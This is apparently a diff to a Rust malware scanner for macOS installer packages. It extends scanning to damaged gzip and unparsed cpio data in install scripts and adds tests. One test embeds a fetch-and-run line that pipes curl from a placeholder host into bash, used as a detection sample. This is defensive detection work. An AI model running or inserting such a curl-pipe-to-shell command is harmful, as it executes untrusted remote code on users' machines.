@@ -144,14 +144,16 @@ fn scan_scripts_entry(
     let (raw, mut gap) = xar::read_entry_partial(content, archive, entry, limits)
         .map_err(|_| RuleOutcome::NotApplicable)?;
 
+    let label = format!("{}!{}", ctx.path.display(), entry.path);
     // Scripts is normally gzip-wrapped cpio; if not gzip, `read_entry`
     // already undid the heap encoding. A damaged inner gzip is scanned as far
-    // as it decoded and reported incomplete.
+    // as it decoded, and the raw bytes are scanned too: both are evidence.
     let archive_bytes = match crate::inflate::gzip_decompress_partial(&raw, limits.max_entry_bytes)
     {
         (v, Ok(())) => v,
         (v, Err(e)) if !v.is_empty() => {
             gap.get_or_insert(xar::XarEntryError::Undecodable(e));
+            findings.scan(label.clone(), raw, "install scripts (unparsed)");
             v
         }
         (_, Err(_)) => raw,
@@ -159,12 +161,19 @@ fn scan_scripts_entry(
 
     let Some(members) = cpio::parse(&archive_bytes, &cpio::CpioLimits::default()) else {
         // Something is in there, but not in a shape we can read: scan it raw.
-        let label = format!("{}!{}", ctx.path.display(), entry.path);
         findings.scan(label, archive_bytes, "install scripts (unparsed)");
         return Err(RuleOutcome::NotApplicable);
     };
-    // Members that did parse are scanned even when the archive is cut short.
+    // Members that did parse, and the bytes after a halt, are scanned even
+    // when the archive is cut short.
     let complete = members.is_complete() && gap.is_none();
+    if !members.unparsed.is_empty() {
+        findings.scan(
+            label,
+            members.unparsed.to_vec(),
+            "install scripts (unparsed)",
+        );
+    }
 
     for member in &members.entries {
         if !member.is_regular_file() || member.data.is_empty() {
@@ -1428,6 +1437,61 @@ mod tests {
             .expect("evaluates")
             .is_some());
         assert!(!c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    /// A stored `Scripts` gzip cut inside the DEFLATE body: the last
+    /// member's body is short, its decoded part is still scanned (#75).
+    #[test]
+    fn a_scripts_gzip_cut_mid_stream_scans_the_cut_short_member() {
+        let full = include_bytes!("../../testdata/gzip/scripts_dropper_long.in");
+        let plain = include_bytes!("../../testdata/gzip/scripts_dropper_long.out");
+        let cut = &full[..full.len() - 8 - 100];
+
+        let (prefix, err) = crate::inflate::gzip_decompress_partial(cut, 1 << 20);
+        assert!(err.is_err());
+        assert!(prefix.len() < plain.len());
+        assert!(prefix.windows(4).any(|w| w == b"curl"));
+
+        let c = ctx("s.pkg", &pkg_with_scripts(cut));
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the decoded prefix scores");
+        assert!(
+            signal.description.contains("install scripts (unparsed)"),
+            "{}",
+            signal.description
+        );
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    /// A gzip header, one decoded byte, then an invalid DEFLATE symbol,
+    /// followed by plaintext: the raw bytes are scanned as well (#75).
+    #[test]
+    fn a_failing_inner_gzip_still_scans_the_raw_bytes() {
+        let mut blob = vec![0x1f, 0x8b, 0x08, 0, 0, 0, 0, 0, 0, 3];
+        // Fixed-Huffman block: literal 'a', then the invalid symbol 286.
+        blob.extend_from_slice(&[0x4b, 0x1c, 0x03]);
+        blob.extend_from_slice(
+            b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n",
+        );
+
+        let (v, r) = crate::inflate::gzip_decompress_partial(&blob, 1 << 20);
+        assert_eq!(v, b"a");
+        assert!(matches!(r, Err(crate::decode::DecodeError::Malformed)));
+
+        // Zlib on the heap, so the gzip is read by the rule, not the xar layer.
+        let c = ctx("s.pkg", &pkg_with_scripts(&zlib_stored(&blob)));
+        let signal = InstallerScriptRule
+            .evaluate(&c)
+            .expect("evaluates")
+            .expect("the raw bytes score");
+        assert!(
+            signal.description.contains("install scripts (unparsed)"),
+            "{}",
+            signal.description
+        );
+        assert!(c.marked_incomplete("installer-script-suspicious"));
     }
 
     #[test]
